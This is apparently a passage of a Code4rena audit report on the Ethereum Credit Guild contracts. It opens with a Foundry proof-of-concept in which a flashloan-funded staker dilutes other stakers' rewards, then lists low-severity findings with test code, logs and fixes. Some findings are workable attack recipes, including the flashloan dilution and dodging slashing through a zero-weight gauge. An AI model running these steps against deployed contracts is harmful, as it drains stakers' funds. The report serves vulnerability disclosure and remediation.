        // NOTE: Alice needs to transfer the borrowed 100e18 gUSDC to EXPLOITER for repayment.

        
        console.log("-------------------------------AFTER ATTACK-------------------------------");
        console.log("EXPLOITER Credit Balance before flashloan:                              ", gUSDC.balanceOf(EXPLOITER));
        // EXPLOITER gets a flashloan.
        gUSDC.mint(EXPLOITER, 10_000_000e18);
        console.log("EXPLOITER Credit Balance after flashloan:      ", gUSDC.balanceOf(EXPLOITER));
        vm.startPrank(EXPLOITER);
        gUSDC.approve(address(sgmUSDC), 10_000_000e18);
        sgmUSDC.stake(termUSDC, 10_000_000e18);
        console.log("EXPLOITER Credit balance after stake:                                   ", gUSDC.balanceOf(EXPLOITER));
        vm.stopPrank();

    	vm.warp(block.timestamp + 150 days);
        uint256 interest = _computeAliceLoanInterest(borrowTime, 100e18);
        vm.prank(governor);
        profitManagerUSDC.setProfitSharingConfig(
            0.05e18, // surplusBufferSplit
            0.9e18, // creditSplit
            0.05e18, // guildSplit
            0, // otherSplit
            address(0) // otherRecipient
        );

        profitManagerUSDC.notifyPnL(termUSDC, int256(interest));
        
        sgmUSDC.getRewards(EXPLOITER, termUSDC);
        console.log("EXPLOITER (instant) Credit reward:                     ", gUSDC.balanceOf(address(EXPLOITER)));
        console.log("EXPLOITER (instant) Guild reward:                     ", guild.balanceOf(address(EXPLOITER)));
        //EXPLOITER's profit is based on the guild split since he own almost all of the GUILD totalSupply.

        vm.startPrank(EXPLOITER);
        sgmUSDC.unstake(termUSDC, 10_000_000e18);
        vm.stopPrank();

        console.log("EXPLOITER credit balance after unstake:        ", gUSDC.balanceOf(EXPLOITER));

        // NOTE: EXPLOITER repays the flash loan here.

        sgmUSDC.getRewards(STAKER1, termUSDC);
        sgmUSDC.getRewards(STAKER2, termUSDC);
        sgmUSDC.getRewards(STAKER3, termUSDC);
        console.log("Staker1 credit reward:                                      ", gUSDC.balanceOf(address(STAKER1)));
        console.log("Staker1 guild reward:                                      ", guild.balanceOf(address(STAKER1)));
        console.log("Staker2 credit reward:                                     ", gUSDC.balanceOf(address(STAKER2)));
        console.log("Staker2 guild reward:                                      ", guild.balanceOf(address(STAKER2)));
        console.log("Staker3 credit reward:                                     ", gUSDC.balanceOf(address(STAKER3)));
        console.log("Staker3 guild reward:                                      ", guild.balanceOf(address(STAKER3)));
        console.log("GaugeProfitIndex:                                     ", profitManagerUSDC.gaugeProfitIndex(termUSDC));
    }

    // Function that will compute Alice's interest with which notifyPnL will be called so that the attack is as accurate as possible
    function _computeAliceLoanInterest(uint borrowTime, uint borrowAmount) private view returns (uint interest) {
        uint256 _INTEREST_RATE = 0.10e18; // 10% APR --- from LendingTerm tests
        uint256 YEAR = 31557600;

        interest = (borrowAmount * _INTEREST_RATE * (block.timestamp - borrowTime)) / YEAR / 1e18;
    }
}
```

There are tests for both cases – one without the attack and another with the attack scenario.

Run them with:

```solidity
forge test --match-contract "DeflateGuildHoldersRewardsUnitTest" --match-test "testGuildHoldersRewards" -vvv
```

```solidity
Logs:
  -------------------------------AFTER ATTACK-------------------------------
  EXPLOITER Credit Balance before flashloan:                               0
  EXPLOITER Credit Balance after flashloan:       10000000000000000000000000
  EXPLOITER Credit balance after stake:                                    0
  EXPLOITER (instant) Credit reward:                      205305960080000000
  EXPLOITER (instant) Guild reward:                      1026529800400000000
  EXPLOITER credit balance after unstake:         10000000205305960080000000
  Staker1 credit reward:                                       4106119201600
  Staker1 guild reward:                                       20530596008000
  Staker2 credit reward:                                      16424476806400
  Staker2 guild reward:                                       82122384032000
  Staker3 credit reward:                                      12318357604800
  Staker3 guild reward:                                       61591788024000
  GaugeProfitIndex:                                      1000000010265298004

Logs:
  ------------------------------BEFORE ATTACK------------------------------
  Staker1 credit reward:                                   25667351129363200
  Staker1 guild reward:                                   128336755646816000
  Staker2 credit reward:                                  102669404517452800
  Staker2 guild reward:                                   513347022587264000
  Staker3 credit reward:                                   77002053388089600
  Staker3 guild reward:                                   385010266940448000
  GaugeProfitIndex:                                      1000064168377823408
```

## Tools Used

Manual

## Recommended Mitigation Steps

Providing recommendations is challenging due to the large codebase, and code changes might affect other parts of the system.

The things we came up with to protect against this are: to not allow staking and unstaking in the same block, implementing staking/unstaking fee, or implementing a "warm-up period" during which stakers are unable to accumulate interest.

We are open to collaborate with the development team to find a proper mitigation for the problem.

## [L-01] `ProfitManager::donateToTermSurplusBuffer()` does not check if the term is from the same market

**Issue Description:**

Users can lose their `CREDIT` tokens by calling or `donateToTermSurplusBuffer` for a non-existing term and transferring their tokens to the wrong or eventually non-existing address.

[ProfitManager.sol#L258-L264](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/ProfitManager.sol#L258-L264)

```solidity
/// @notice donate to surplus buffer of a given term
    function donateToTermSurplusBuffer(address term, uint256 amount) external {
        CreditToken(credit).transferFrom(msg.sender, address(this), amount);
        uint256 newSurplusBuffer = termSurplusBuffer[term] + amount;
        termSurplusBuffer[term] = newSurplusBuffer;
        emit TermSurplusBufferUpdate(block.timestamp, term, newSurplusBuffer);
    }
```

They won’t be able to rescue their tokens unless contract/user with `GUILD_SURPLUS_BUFFER_WITHDRAW` role calls it for a user who has lost his tokens.

[ProfitManager.sol#L277-L287](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/ProfitManager.sol#L277-L287)

```solidity
/// @notice withdraw from surplus buffer
    function withdrawFromSurplusBuffer(address to, uint256 amount)
        external
        onlyCoreRole(CoreRoles.GUILD_SURPLUS_BUFFER_WITHDRAW)
    {
        uint256 newSurplusBuffer = surplusBuffer - amount; // this would revert due to underflow if withdrawing > surplusBuffer
        surplusBuffer = newSurplusBuffer;
        CreditToken(credit).transfer(to, amount);
        emit SurplusBufferUpdate(block.timestamp, newSurplusBuffer);
    }
```

**Recommendation:**

Consider adding check if term is actually a `LendingTerm` contract, modify `donateToTermSurplusBuffer`:

```diff
/// @notice donate to surplus buffer of a given term
    function donateToTermSurplusBuffer(address term, uint256 amount) external {
+       require(LendingTerm(term).getReferences().creditToken == credit, "ProfitManager: term from wrong market!");     
        CreditToken(credit).transferFrom(msg.sender, address(this), amount);
        uint256 newSurplusBuffer = termSurplusBuffer[term] + amount;
        termSurplusBuffer[term] = newSurplusBuffer;
        emit TermSurplusBufferUpdate(block.timestamp, term, newSurplusBuffer);
    }
```

---

## [L-02] `ProfitManager::NotifyPnL` will revert in case of loss == (_surplusBuffer + termSurplusBuffer)

**Issue Description:**

An edge case can occur if `notifyPnL` is called from `LendingTerm` with an amount equal to the sum of `_surplusBuffer` and `termSurplusBuffer`. The result will be a revert because divide by zero will occur since `loss -= _surplusBuffer` that will prevent the bad debt realization:

```solidity
function notifyPnL(address gauge, int256 amount) external onlyCoreRole(CoreRoles.GAUGE_PNL_NOTIFIER) {
        ... More code
            if (_termSurplusBuffer != 0) {
                termSurplusBuffer[gauge] = 0;
                emit TermSurplusBufferUpdate(block.timestamp, gauge, 0);
                _surplusBuffer += _termSurplusBuffer;
            }

            if (loss < _surplusBuffer) {
                // deplete the surplus buffer
                surplusBuffer = _surplusBuffer - loss;
                emit SurplusBufferUpdate(block.timestamp, _surplusBuffer - loss);
                CreditToken(_credit).burn(loss);
            } else {
                // empty the surplus buffer
                loss -= _surplusBuffer; //@audit will be equal to zero
                surplusBuffer = 0;
                CreditToken(_credit).burn(_surplusBuffer);
                emit SurplusBufferUpdate(block.timestamp, 0);

                // update the CREDIT multiplier
                uint256 creditTotalSupply = CreditToken(_credit).totalSupply();
                uint256 newCreditMultiplier = (creditMultiplier * (creditTotalSupply - loss)) / creditTotalSupply; //@audit 0 / creditTotalSupply
                creditMultiplier = newCreditMultiplier;
                emit CreditMultiplierUpdate(block.timestamp, newCreditMultiplier);
            }
        }
```

**Proof of Concept:**

1. navigate to `src/unit/loan/SurplusGuildMinter.t.sol`
2. place the test
3. execute the test: `forge test --match-contract "SurplusGuildMinterUnitTest" --match-test "testNotifyPnLDivideByZero"`

```solidity
function testNotifyPnLDivideByZero() public {
    // setup
    credit.mint(address(this), 150e18);
    credit.approve(address(sgm), 150e18);
    sgm.stake(term, 150e18);
    
    profitManager.notifyPnL(term, -150e18);
}
```

**Recommendation:**

While this is extremely rare scenario to occur, consider to handle the case when `loss == 0` after the subtraction and take the appropriate actions, as this will indicate that loans are insolvent and term most likely will have to be off-boarded. 

---

## [L-03] `MinBorrow` must be based on the market token

**Issue Description:**

In `LendingTerm.sol`, `minBorrow` is set to 100e18 on deployment which will be a problem when `collateralToken` is an expensive asset such as ETH(~$2000 x 100) or BTC (~$42,000 x 100). This highly decreases the target group of people who are willing to put in that much collateral and open a loan, especially in an immature protocol such as ECG.

[LendingTerm.sol#L365-L368](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/LendingTerm.sol#L365-L368)

```solidity
require(borrowAmount >= ProfitManager(refs.profitManager).minBorrow(), "LendingTerm: borrow amount too low");
```

[ProfitManager.sol#L151-L153](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/ProfitManager.sol#L151-L153)

```solidity
uint256 internal _minBorrow = 100e18;

function minBorrow() external view returns (uint256) {
    return (_minBorrow * 1e18) / creditMultiplier;
}
```

In addition, changing the `minBorrow` argument from `ProfitManager::setMinBorrow()` proposal should be made and it has to meet a certain quorum, which will take some time.

**Recommendation:**

Consider setting the `minBorrow` from the constructor of the `ProfitManager` that will make the contracts more versatile and will remove the wait period for executing the `setMinBorrow()` function.

[ProfitManager.sol#106-L108](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/governance/ProfitManager.sol#L106-L108)

```diff
constructor(address _core, uint minBorrow) CoreRef(_core) {
        emit MinBorrowUpdate(block.timestamp, 100e18);
+       _minBorrow = minBorrow //should be carefully chosen by the contract deployer considering the price of collateral token
}
```

---

## [L-04] `gUSDC` onboarder can allow implementation of other markets (eg. `gWETH`)

**Issue Description:**

There will be many `LendingTermOnboarding.sol` contracts for every `CREDIT` token used, but there is no check whether the implementation passed to `allowImplementation` function is from the same market. 

There can be case when certain `gWETH` implementation is not allowed in the `LendingTermOnboarding` for `gWETH`, but mistakenly allowed in the `LendingTermOnboarding` for `gUSDC`. The result will be fully functioning `LendingTerm` onboarded from wrong contract and potentially malicious behaviour. 

[LendingTermOnboarding.sol#L92-L102](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/governance/LendingTermOnboarding.sol#L92-L102)

```solidity
function allowImplementation(
        address implementation,
        bool allowed
    ) external onlyCoreRole(CoreRoles.GOVERNOR) {
        implementations[implementation] = allowed;
        emit ImplementationAllowChanged(
            block.timestamp,
            implementation,
            allowed
        );
    }
```

**Recommendation:**

Consider checking if the implementation passed is with the same `CREDIT` token as one in the used in this particular `LendingTermOnboarding`.

---

## [L-05] `CoreRef::emergencyAction` is susceptible to returnbomb attack

**Issue Description:**

Emergency action defined in `CoreRef.sol` which is inherited from all the contracts is a good addition which can be used for various purposes (rescuing tokens, executing certain functions, etc.) but it does not use assembly for consuming the returned data which makes it vulnerable to [returnbomb](https://gist.github.com/pcaversaccio/3b487a24922c839df22f925babd3c809) attack. Since this action can be used for various purposes, including calling untrusted external contracts this is a real possibility for griefing attack: 

[CoreRef.sol#L87-L107](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/core/CoreRef.sol#L87-L107)

```solidity
/// @notice due to inflexibility of current smart contracts,
/// add this ability to be able to execute arbitrary calldata
/// against arbitrary addresses.
/// callable only by governor
function emergencyAction(Call[] calldata calls)
    external
    payable
    onlyCoreRole(CoreRoles.GOVERNOR)
    returns (bytes[] memory returnData)
{
    returnData = new bytes[](calls.length);
    for (uint256 i = 0; i < calls.length; i++) {
        address payable target = payable(calls[i].target);
        uint256 value = calls[i].value;
        bytes calldata callData = calls[i].callData;

        (bool success, bytes memory returned) = target.call{value: value}(callData);
        require(success, "CoreRef: underlying call reverted");
        returnData[i] = returned;
    }
}
```

**Recommendation:**

Consider using [ExcessivelySafeCall](https://github.com/nomad-xyz/ExcessivelySafeCall/blob/main/src/ExcessivelySafeCall.sol) library or assembly to remove the potential vulnerability.

## [L-06] If borrower become blacklisted for his collateral his loan need to be forgiven in case to receive it

**Issue Description:**

If a user is blacklisted for his collateral, trying to repay() will result in a revert. The only way to settle this loan is for the Governor to initiate forgive(), and then the Governor must transfer the tokens to the user. This design choice may not be ideal, as the user might require these tokens immediately.

**Recommendation:**

Consider implement a parameter when full repay is called from the borrower to be able to give another collateral receiver.

## **[L‑07] `IncrementGauge` can be called with 0 weight**

**Issue Description:**

There is no check whether the passed weight from `GUILD` holder is greater than 0.

[ERC20Gauges.sol#L219-226](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/tokens/ERC20Gauges.sol#L219-L226)

```solidity
function incrementGauge(address gauge, uint256 weight) public virtual returns (uint256 newUserWeight) {
        require(isGauge(gauge), "ERC20Gauges: invalid gauge");
        _incrementGaugeWeight(msg.sender, gauge, weight);
        return _incrementUserAndGlobalWeights(msg.sender, weight);
    }
```

We’ve been discussing potential scenario where this can be used to create an infinite loop in `_decrementWeightUntilFree` as the increment of `i` is done only in case `userGaugeWeight` is different than 0:

[ERC20Gauges.sol#L500-L539](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/tokens/ERC20Gauges.sol#L500-L539)

```solidity
function _decrementWeightUntilFree(address user, uint256 weight) internal {
    uint256 userFreeWeight = balanceOf(user) - getUserWeight[user];

		// early return if already free
    if (userFreeWeight >= weight) return;

    // cache totals for batch updates
    uint256 userFreed;
    uint256 totalFreed;

    // Loop through all user gauges, live and deprecated
    address[] memory gaugeList = _userGauges[user].values();

    // Free gauges until through entire list or under weight
    uint256 size = gaugeList.length;
    for (
        uint256 i = 0;
        i < size && (userFreeWeight + userFreed) < weight;

    ) {
        address gauge = gaugeList[i];
        uint256 userGaugeWeight = getUserGaugeWeight[user][gauge];
        if (userGaugeWeight != 0) {
            userFreed += userGaugeWeight;
            _decrementGaugeWeight(user, gauge, userGaugeWeight);

            // If the gauge is live (not deprecated), include its weight in the total to remove
            if (!_deprecatedGauges.contains(gauge)) {
                totalTypeWeight[gaugeType[gauge]] -= userGaugeWeight;
                totalFreed += userGaugeWeight;
            }

            unchecked {
                ++i; //@audit only in case userGaugeWeight != 0
            }
        }
    }

    totalWeight -= totalFreed;
}
```

That way if user manages to put a gauge with 0 weight at 0 position in his `userGauges` and after that all the others, he can effectively **avoid slashing and grief the applier** who calls `applyGaugeLoss` for him.

Other than that `transfer`, `transferFrom` and `burn` will always lead to infinite loop if user doesn’t have enough balance and weight has to be freed, but there is weight of 0 in the first iteration of the for loop above.

**Recommendation:**

Verify that the weight passed is greater than 0, that will mitigate the possible griefing possibility.

# [L-08] Credit rewards accrue for slashed users

## Impact

Slashed stakers will lose their `GUILD` tokens but will still receive `CREDIT` tokens once more because `creditReward` is not zeroed like `guildReward` in `SurplusGuildMinter::getRewards()`. That will eventually create bad debt in the system as all the stakers for this term will be slashed and their rewards have to be lost, but this is not the case for the `CREDIT` tokens.

## Proof of Concept

We can see in the `getRewards()` function that `_profitIndex` is updated in `[ProfitManager.claimRewards()](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/ProfitManager.sol#L409-L436)` which will increase `deltaIndex` and despite the user being slashed he will still receive the `CREDIT` tokens that he would have if he hadn’t been slashed:

[SurplusGuildMinter#L244-L264](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/SurplusGuildMinter.sol#L244-L264)

```solidity
function getRewards(address user, address term)
    public
    returns (
        uint256 lastGaugeLoss, // GuildToken.lastGaugeLoss(term)
        UserStake memory userStake, // stake state after execution of getRewards()
        bool slashed // true if the user has been slashed
    )
{
    bool updateState;
    lastGaugeLoss = GuildToken(guild).lastGaugeLoss(term);
    if (lastGaugeLoss > uint256(userStake.lastGaugeLoss)) {
        slashed = true;
    }

    // if the user is not staking, do nothing
    userStake = _stakes[user][term];
    if (userStake.stakeTime == 0)
        return (lastGaugeLoss, userStake, slashed);

    // compute CREDIT rewards
    ProfitManager(profitManager).claimRewards(address(this)); // this will update profit indexes
    uint256 _profitIndex = ProfitManager(profitManager).userGaugeProfitIndex(address(this), term);
    uint256 _userProfitIndex = uint256(userStake.profitIndex);
    if (_profitIndex == 0) _profitIndex = 1e18;
    if (_userProfitIndex == 0) _userProfitIndex = 1e18;

    uint256 deltaIndex = _profitIndex - _userProfitIndex;

    if (deltaIndex != 0) {
        uint256 creditReward = (uint256(userStake.guild) * deltaIndex) / 1e18;
        uint256 guildReward = (creditReward * rewardRatio) / 1e18;
        if (slashed) {
            guildReward = 0;
            //@audit creditRewards = 0 is missing
        }

        // forward rewards to user
        if (guildReward != 0) {
            RateLimitedMinter(rlgm).mint(user, guildReward);
            emit GuildReward(block.timestamp, user, guildReward);
        }
        if (creditReward != 0) {
            //@audit will receive them despite being slashed
            CreditToken(credit).transfer(user, creditReward);
        }
... More code
    }
```

## Tools Used

Manual Review

## Recommended Mitigation Steps

Consider setting creditReward to 0 when user passed is staked in order to not transfer any `CREDIT` tokens to him when he is slashed:

```diff
function getRewards(address user, address term)
        public
        returns (
            uint256 lastGaugeLoss, // GuildToken.lastGaugeLoss(term)
            UserStake memory userStake, // stake state after execution of getRewards()
            bool slashed // true if the user has been slashed
        )
    {
---> More code
        uint256 _profitIndex = ProfitManager(profitManager).userGaugeProfitIndex(address(this), term);
        uint256 _userProfitIndex = uint256(userStake.profitIndex);
        if (_profitIndex == 0) _profitIndex = 1e18;
        if (_userProfitIndex == 0) _userProfitIndex = 1e18;

        uint256 deltaIndex = _profitIndex - _userProfitIndex;

        if (deltaIndex != 0) {
            uint256 creditReward = (uint256(userStake.guild) * deltaIndex) / 1e18;
            uint256 guildReward = (creditReward * rewardRatio) / 1e18;
            if (slashed) {
                guildReward = 0;
+               creditReward = 0
            }

            // forward rewards to user
            if (guildReward != 0) {
                RateLimitedMinter(rlgm).mint(user, guildReward);
                emit GuildReward(block.timestamp, user, guildReward);
            }
            if (creditReward != 0) {
                //@audit will receive them despite being slashed
                CreditToken(credit).transfer(user, creditReward);
            }
---> More code
        }
```

# [L-09] Hardcoded block numbers will lead to unsuccessful off-boarding

## Impact

Off-boarding is with a duration of **46523 blocks** (7 days), calculated from `block.number` on the Ethereum chain 13 sec/block, but the development team wants to deploy in L2 chains as well:

> [• **Deployment**: we anticipate to launch on Ethereum mainnet & L2s like Arbitrum.](https://github.com/code-423n4/2023-12-ethereumcreditguild/tree/main?tab=readme-ov-file#additional-context)
> 

There is no way to change the off-boarding duration and most of the proposals on the L2 chains will fail due to the high amount of votes required in a short amount of period.

## Proof of Concept

https://github.com/0xJuancito/multichain-auditor?tab=readme-ov-file#block-production-may-not-be-constant
The most widely used L2 chains are `Arbitrum`, `Optimism`, and `Polygon zkEVM`. But the average block time is different on all of them:

- `Arbitrum` - 0.26 sec
- `Optimism` - 2 sec
- `Polygon zkEVM` - 7 sec

On **Optimism** 46523 blocks will pass for approximately 26 hours as there are 1800 blocks per hour.

If we take **Arbitrum** 46523 blocks will pass for approximately 3 hours and 36 minutes as there are 13846 blocks per hour.

We can see from the proposals (`GIP_0.sol`) `10_000_000e18` set as an `OFFBOARD_QUORUM` and we can conclude that there is no way quorum to be satisfied within 216 minutes.

Governor can change the quorum for a given `LendingTermOffboarding.sol` contract but this exposes risk as this will significantly decrease the decentralization.

## Tools Used

Manual Review

## Recommended Mitigation Steps

Consider allowing the deployer to set the `POLL_DURATION_BLOCKS` from the constructor instead of assigning it to constant.

# [L-10] Hardcoded Min_stake of 1e18 doesn’t incentivize staking expensive tokens

## Impact

Each CREDIT Token holder (`gUSDC`, `gWETH`, `gWBTC`, etc.) can stake them and start voting in a gauge. However, there's a minimum staking amount (MIN_STAKE) of 1e18. This means that for certain markets, staking will be more expensive compared to others because of this fixed minimum stake requirement.

## Proof of Concept

For instance, in the case of `gUSDC`, users looking to stake will need to provide approximately 1 USDC (based on creditMultiplier). On the other hand, for `gWBTC`, they would need to stake around 1 BTC ($42,000 at the time of writing). This could discourage users from staking in such terms.

```solidity
contract SurplusGuildMinter is CoreRef {
    /// @notice minimum number of CREDIT to stake
    uint256 public constant MIN_STAKE = 1e18;

....
```

## Tools Used

Manual Review

## Recommended Mitigation Steps

Include the MIN_STAKE value in the constructor, making it dependent on the Credit Token for that specific term.

# [L-11] Guild rewards are calculated wrong

## Impact

Every staker in the SurplusGuildMinter accumulates rewards for their Guild tokens received upon staking. The reward calculation relies on the Guild amount for each staker converted to Credit reward and the current reward ratio. However, there is an issue with how rewards are handled after the update of the reward ratio.

When the `rewardRatio` changes, the guild rewards up to that point should be calculated based on the old ratio. After the change, new rewards should be accumulated based on the updated ratio. However, the current implementation doesn't support this behavior. Instead, regardless of how the `rewardRatio` changes, it always multiplies it with the staker's guild amount converted to credit reward. This is because, on a `rewardRatio` update, the system does not store all staker rewards up to that moment.

See: [Line 252](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/SurplusGuildMinter.sol#L252)

```solidity
File: src/loan/SurplusGuildMinter.sol

216: function getRewards(
217:     address user,
218:     address term
219: )
				 // ... (Code)
248:
249:     if (deltaIndex != 0) {
250:         uint256 creditReward = (uint256(userStake.guild) * deltaIndex) /
251:             1e18;
252:  -->    uint256 guildReward = (creditReward * rewardRatio) / 1e18;

				 // ... (More Code)
```

The issue lies in the fact that, irrespective of the rewardRatio being 10%, 8%, or 6%, the computation takes place only when the **`getRewards()`** function is called. This poses a problem because if a staker has maintained their stake from the beginning and calls **`getRewards()`** later when the ratio is, for instance, 6%, they won't receive the correct amount of rewards but the calculation will calculate it as if it was 6% from the beginning.

Also, if staker A stakes at time 0 and claims rewards at a 6% rate at time 1500, and staker B stakes at time 1499 and claims rewards with staker A at time 1500, both will receive the same amount. This is totally wrong and remove the incentive for staking.

![Reward](https://i.imgur.com/zmn7yJ8.png)

## Proof of Concept 1

1. A staker stakes 1000 credit tokens at a 2:1 ratio, receiving 2000 Guild tokens.
2. The RewardRatio decreases twice, first from 10% to 8%, and then to 6%.
3. Despite being a staker during these changes, the staker doesn't claim rewards.
4. When they finally call **`getRewards()`**, the rewardRatio is 6%, resulting in an incorrect payout from 2000 guild (in the form of credit rewards) * 6%. This is inaccurate as the staker joined when the reward ratio was 10%.

Results from the diagram provided above and test.

> ***Note:*** *The rewards are calculated based on converting 2000 guild tokens to creditReward and subsequently multiplying the result by the rewardRatio.
The table demonstrates how rewards vary when claimed in three different situations after applying a `notifyPnL()` with 1e18.

**It's important to note that these rewards are not added together and* `getRewards()` is called only one time*. Refer to the test below for more detailed information.***
> 

| RewardRatio at called block | Block at which getRewards() is called | Rewards |
| --- | --- | --- |
| 10% | 4 | 5e15 |
| 8% | 9 | 4e15 |
| 6% | 15 | 3e15 |

### Coded PoC

Import `console` from `"@forge-std/Test.sol”`
Comment out these 2 lines in the setup to work on an empty balance and see it more clearly:

```solidity
74: guild.mint(address(this), 50e18);
75: guild.incrementGauge(term, uint112(50e18));
```

Place the 3 tests in `SurplusGuildMinter.t.sol`

Run them with:

```solidity
forge test --match-contract "SurplusGuildMinterUnitTest" --match-test "testGuildRewardsWrongAccumulated" -vvv
```

```solidity
function testGuildRewardsWrongAccumulatedCase1() public {
    vm.prank(governor);
    sgm.setRewardRatio(0.1e18); // From deploy script

    credit.mint(address(this), 100e18);

    vm.startPrank(address(this));
    credit.approve(address(sgm), 100e18);
    sgm.stake(term, 100e18);
    vm.stopPrank();

		vm.warp(block.timestamp + 4 * 13);
    vm.prank(governor);
    profitManager.setProfitSharingConfig(
        0.05e18, // surplusBufferSplit
        0.9e18, // creditSplit
        0.05e18, // guildSplit
        0, // otherSplit
        address(0) // otherRecipient
    );

    credit.mint(address(profitManager), 1e18);
    profitManager.notifyPnL(term, 1e18);

    console.log("Staker guild balance after accumulating rewards:                    ", guild.balanceOf(address(this)));
    sgm.getRewards(address(this), term);
    console.log("Staker guild reward if claim them at 10% rewardRate:  ", guild.balanceOf(address(this)));

    vm.warp(block.timestamp + 5 * 13);
    vm.prank(governor);
    sgm.setRewardRatio(0.08e18);

    vm.warp(block.timestamp + 6 * 13);
    vm.prank(governor);
    sgm.setRewardRatio(0.06e18);
}

function testGuildRewardsWrongAccumulatedCase2() public {
    vm.prank(governor);
    sgm.setRewardRatio(0.1e18); // From deploy script

    credit.mint(address(this), 100e18);

    vm.startPrank(address(this));
    credit.approve(address(sgm), 100e18);
    sgm.stake(term, 100e18);
    vm.stopPrank();

		vm.warp(block.timestamp + 4 * 13);
    vm.prank(governor);
    profitManager.setProfitSharingConfig(
        0.05e18, // surplusBufferSplit
        0.9e18, // creditSplit
        0.05e18, // guildSplit
        0, // otherSplit
        address(0) // otherRecipient
    );

    credit.mint(address(profitManager), 1e18);
    profitManager.notifyPnL(term, 1e18);

    console.log("Staker guild balance after accumulating rewards:                    ", guild.balanceOf(address(this)));

    vm.warp(block.timestamp + 5 * 13);
    vm.prank(governor);
    sgm.setRewardRatio(0.08e18);

    sgm.getRewards(address(this), term);
    console.log("Staker guild reward if claim them at 8% rewardRate:   ", guild.balanceOf(address(this)));

    vm.warp(block.timestamp + 6 * 13);
    vm.prank(governor);
    sgm.setRewardRatio(0.06e18);
}

function testGuildRewardsWrongAccumulatedCase3() public {
    vm.prank(governor);
    sgm.setRewardRatio(0.1e18); // From deploy script

    credit.mint(address(this), 100e18);

    vm.startPrank(address(this));
    credit.approve(address(sgm), 100e18);
    sgm.stake(term, 100e18);
    vm.stopPrank();

		vm.warp(block.timestamp + 4 * 13);
    vm.prank(governor);
    profitManager.setProfitSharingConfig(
        0.05e18, // surplusBufferSplit
        0.9e18, // creditSplit
        0.05e18, // guildSplit
        0, // otherSplit
        address(0) // otherRecipient
    );

    credit.mint(address(profitManager), 1e18);
    profitManager.notifyPnL(term, 1e18);

    console.log("Staker guild balance after accumulating rewards:                    ", guild.balanceOf(address(this)));

    vm.warp(block.timestamp + 5 * 13);
    vm.prank(governor);
    sgm.setRewardRatio(0.08e18);

    vm.warp(block.timestamp + 6 * 13);
    vm.prank(governor);
    sgm.setRewardRatio(0.06e18);

    sgm.getRewards(address(this), term);
    console.log("Staker guild reward if claim them at 6% rewardRate:   ", guild.balanceOf(address(this)));
}
```

```solidity
[PASS] testGuildRewardsWrongAccumulatedCase1() (gas: 734911)
Logs:
  Staker guild balance after accumulating rewards:                     0
  Staker guild reward if claim them at 10 rewardRate:   5000000000000000

[PASS] testGuildRewardsWrongAccumulatedCase2() (gas: 734884)
Logs:
  Staker guild balance after accumulating rewards:                     0
  Staker guild reward if claim them at 8 rewardRate:    4000000000000000

[PASS] testGuildRewardsWrongAccumulatedCase3() (gas: 734945)
Logs:
  Staker guild balance after accumulating rewards:                     0
  Staker guild reward if claim them at 6 rewardRate:    3000000000000000
```

## Proof of Concept 2

1. Staker A stakes 1000 Credits on block 0 with a 10% rate.
2. Staker B stakes the same amount on block 1499.
3. Rewards accumulate until block 1500, and both stakers call **`getRewards()`**.
4. Both end up with the same rewards.

### Coded PoC

Import `console` from `"@forge-std/Test.sol”`

Place the test in `SurplusGuildMinter.t.sol`

Run with:

```solidity
forge test --match-contract "SurplusGuildMinterUnitTest" --match-test "testGuildRewardsFor2Stakers" -vvv
```

```solidity
function testGuildRewardsFor2Stakers() public {
    vm.prank(governor);
    sgm.setRewardRatio(0.1e18); // From deploy script

    credit.mint(address(this), 100e18);

    vm.startPrank(address(this));
    credit.approve(address(sgm), 100e18);
    sgm.stake(term, 100e18);
    vm.stopPrank();

		vm.warp(block.timestamp + 149 * 13);

    address staker2 = makeAddr("staker2");
    credit.mint(staker2, 100e18);

    vm.startPrank(staker2);
    credit.approve(address(sgm), 100e18);
    sgm.stake(term, 100e18);
    vm.stopPrank();

    vm.warp(block.timestamp + 1 * 13);
    vm.prank(governor);
    profitManager.setProfitSharingConfig(
        0.05e18, // surplusBufferSplit
        0.9e18, // creditSplit
        0.05e18, // guildSplit
        0, // otherSplit
        address(0) // otherRecipient
    );

    credit.mint(address(profitManager), 1e18);
    profitManager.notifyPnL(term, 1e18);

    sgm.getRewards(address(this), term);
    sgm.getRewards(staker2, term);
    console.log("StakerA guild reward if claim them at 10%% rewardRate:   ", guild.balanceOf(address(this)));
    console.log("StakerB guild reward if claim them at 10%% rewardRate:   ", guild.balanceOf(staker2));
}
```

```solidity
Logs:
  StakerA guild reward if claim them at 10% rewardRate:    2500000000000000
  StakerB guild reward if claim them at 10% rewardRate:    2500000000000000
```

## Tools Used

Manual Review

## Recommended Mitigation Steps

When the Governor calls **`setRewardRatio()`**, it should first invoke **`getRewards()`** for all stakers. Moreover, it is crucial to implement an elapsed time logic for calculating rewards based on the duration elapsed from one `rewardRatio` to another. Each update of the `rewardRatio` should be treated as a distinct phase, and all rewards for these phases should be stored in the UserStake struct. The calculation for phase rewards should be executed each time **`setRewardRatio()`** is called, considering the time elapsed since the last update.